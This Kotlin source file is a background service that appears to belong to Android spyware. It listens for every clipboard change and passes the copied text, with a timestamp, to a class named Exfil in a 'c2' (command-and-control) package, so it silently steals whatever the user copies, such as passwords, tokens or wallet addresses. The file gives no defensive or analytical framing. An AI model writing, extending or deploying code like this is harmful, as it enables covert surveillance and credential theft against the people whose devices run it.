package com.sp.core.services

import android.app.Service
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import com.sp.core.c2.Exfil

class ClipboardService : Service(), ClipboardManager.OnPrimaryClipChangedListener {

    private lateinit var clipboard: ClipboardManager
    private var lastHash: Long = 0

    override fun onCreate() {
        super.onCreate()
        clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboard.addPrimaryClipChangedListener(this)
    }

    override fun onPrimaryClipChanged() {
        val clip = clipboard.primaryClip ?: return
        val item = clip.getItemAt(0) ?: return
        val text = item.text ?: return
        val hash = text.hashCode().toLong()
        if (hash == lastHash) return
        lastHash = hash
        Exfil.sendLog(this, "clipboard", """{"text":"${esc(text)}","ts":${System.currentTimeMillis()}}""")
    }

    private fun esc(s: String) = s.replace("\\", "\\\\").replace("\"", "\\\"")

    override fun onDestroy() {
        clipboard.removePrimaryClipChangedListener(this)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
